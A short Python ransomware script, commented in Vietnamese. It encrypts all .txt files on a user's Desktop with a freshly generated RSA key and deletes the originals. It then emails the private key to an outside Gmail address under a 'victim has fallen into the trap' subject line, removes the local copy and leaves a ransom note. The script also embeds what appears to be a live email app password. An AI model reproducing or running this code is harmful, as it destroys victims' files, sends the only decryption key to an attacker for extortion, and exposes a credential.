import os
import smtplib
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding


#tao private_key va public_key bang rsa
#public_exponent=65537: Thong thuong so mu cong khai 65537 cung goi la so mu ma hoa


private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)
public_key = private_key.public_key()

# Thư mục chứa các file .txt cần mã hóa
folder_path = os.path.expanduser("~/Desktop")

# Duyệt qua các file trong thư mục và mã hóa tất cả các file .txt
for filename in os.listdir(folder_path):
    if filename.endswith(".txt"):
        file_path = os.path.join(folder_path, filename)
        
        # Đọc dữ liệu từ file cần mã hóa
        with open(file_path, 'rb') as f:
            message = f.read()
        
        # Mã hóa dữ liệu sử dụng public key
        encrypted = public_key.encrypt(
            message,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        
        # Tạo tên file mới với đuôi mở rộng EncryptedQT
        encrypted_file_path = os.path.join(folder_path, filename[:-4] + '.encryptedqt')
        
        # Ghi dữ liệu đã mã hóa vào file mới
        with open(encrypted_file_path, 'wb') as f:
            f.write(encrypted)

        # Xóa file gốc
        os.remove(file_path)

pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)

#gui khóa bí mật về phái máy tấn công

private_key_file = 'private_key.txt'
with open(private_key_file, 'wb') as f:
    f.write(pem)

fromaddr = "-------"
toaddr = "vongnguyetvongnguyet@gmail.com"
msg = MIMEMultipart()
msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "Nạn nhân đã sập bẫy"
body = "Private key"

#file đính kèm
msg.attach(MIMEText(body, 'plain'))
filename = private_key_file
attachment = open(filename, "rb")

part = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', 'attachment', filename=filename)
msg.attach(part)
server = smtplib.SMTP('smtp.gmail.com', 587) # python ucng cap thu vien smtplib su dung nhu mot smtp client de thuc hien gui mail

server.starttls()
server.login(fromaddr, 'snse ties awal kirc')
text = msg.as_string()
server.sendmail(fromaddr, toaddr, text) #gui thu
attachment.close()
server.quit()

os.remove(private_key_file)

infor = open('README.txt', 'wb')
infor.write('File cua ba da bi ma hoa. Muon lay lai du lieu lien he ..........'.encode('utf-8'))